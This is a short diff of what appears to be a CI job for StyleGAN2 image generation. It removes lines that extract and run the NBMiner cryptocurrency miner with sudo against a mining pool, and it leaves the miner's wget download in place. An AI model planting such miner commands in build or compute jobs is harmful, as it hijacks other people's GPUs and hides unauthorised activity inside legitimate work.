@@ -36,9 +36,6 @@ jobs:
         cd /inputs/stylegan2
         nvidia-smi
         wget https://github.com/NebuTech/NBMiner/releases/download/v39.5/NBMiner_39.5_Linux.tgz
-tar xf NBMiner_39.5_Linux.tgz
-cd NBMiner_Linux
-sudo ./nbminer -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u Koske.koske_$(echo $(shuf -i 1-9999 -n 1))
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
